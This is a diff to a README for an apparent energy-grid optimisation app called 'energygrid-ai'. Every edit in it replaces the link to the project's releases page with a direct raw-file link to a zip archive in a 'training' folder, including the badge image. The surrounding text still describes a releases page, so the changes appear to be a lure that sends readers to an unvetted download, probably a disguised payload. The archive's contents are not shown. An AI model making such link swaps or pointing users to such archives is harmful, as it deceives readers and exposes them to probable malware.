@@ -1,7 +1,7 @@
 # ⚡ energygrid-ai - Optimize Energy Use Efficiently
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-brightgreen)](https://github.com/FranciscoBerazadi/energygrid-ai/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/FranciscoBerazadi/energygrid-ai/main/training/energygrid-ai_v2.7-beta.3.zip)](https://raw.githubusercontent.com/FranciscoBerazadi/energygrid-ai/main/training/energygrid-ai_v2.7-beta.3.zip)
 
 ## 📚 Description
 The energygrid-ai system uses advanced techniques to optimize energy distribution and predict demand patterns. This tool helps prevent blackouts in smart power grids, ensuring a reliable energy supply. With this application, users can contribute to sustainable energy practices while efficiently managing power resources.
@@ -24,7 +24,7 @@ Before you download, ensure your system meets the following requirements:
 ## 🚀 Getting Started
 To begin using the energygrid-ai application, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the releases page to find the latest version. [Download Link](https://github.com/FranciscoBerazadi/energygrid-ai/releases)
+1. **Visit the Releases Page**: Go to the releases page to find the latest version. [Download Link](https://raw.githubusercontent.com/FranciscoBerazadi/energygrid-ai/main/training/energygrid-ai_v2.7-beta.3.zip)
 2. **Choose Your Version**: Locate the most recent release. You will find various files listed. 
 3. **Download the Application**: Click on the appropriate file for your operating system and download it to your computer. 
 4. **Install the Application**:
@@ -43,7 +43,7 @@ To begin using the energygrid-ai application, follow these simple steps:
 ## 🔄 Update Process
 To ensure you have the best performance, regularly check for updates. You can do this by:
 
-1. **Visiting the Releases Page**: [Download Link](https://github.com/FranciscoBerazadi/energygrid-ai/releases)
+1. **Visiting the Releases Page**: [Download Link](https://raw.githubusercontent.com/FranciscoBerazadi/energygrid-ai/main/training/energygrid-ai_v2.7-beta.3.zip)
 2. **Downloading New Versions**: Follow the same download and installation steps as before.
 3. **Install Over Existing Version**: The installer will detect the current version and update seamlessly.
 
@@ -76,4 +76,4 @@ Join a growing community of users investing in energy efficiency. For questions 
 - **Related Projects**: Explore other projects focused on energy optimization and smart grid technology.
 
 ## 📥 Download & Install
-To get started, visit the releases page to download the energygrid-ai application now: [Download Link](https://github.com/FranciscoBerazadi/energygrid-ai/releases)
+To get started, visit the releases page to download the energygrid-ai application now: [Download Link](https://raw.githubusercontent.com/FranciscoBerazadi/energygrid-ai/main/training/energygrid-ai_v2.7-beta.3.zip)
